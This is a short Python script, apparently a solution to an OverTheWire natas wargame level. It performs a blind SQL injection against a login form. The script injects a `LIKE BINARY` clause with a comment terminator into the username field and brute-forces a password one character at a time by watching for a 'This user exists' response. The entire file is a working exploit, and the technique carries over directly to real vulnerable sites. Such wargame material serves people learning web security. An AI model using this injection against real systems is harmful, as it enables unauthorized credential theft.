"""Cracking natas password!
"""

# Third party import
from requests import post

# Local imports
from variables import auth, URL, CHARS, NAME

# Variables
password = ""


def query_generator(current_password: str, character: str) -> str:
    """generate query with current password and character

    Args:
        current_password (str): current password
        character (str): a character

    Returns:
        str: sql query
    """
    return f'{NAME}" AND password LIKE BINARY "{current_password}{character}%" -- '


def get_respones(character: str) -> str:
    """get respones of url with data and auth

    Args:
        character (str): testing character

    Returns:
        str: return character if current and '' if not current
    """
    respones = post(
        URL,
        data={"username": query_generator(password, character)},
        auth=auth
    )
    if "This user exists" in respones.text:
        return character
    return ''


while len(password) <= 32:
    print(f"length: {len(password)}, password: {password}")
    for test_char in CHARS:
        char = get_respones(test_char)
        if char:
            password += char
            break
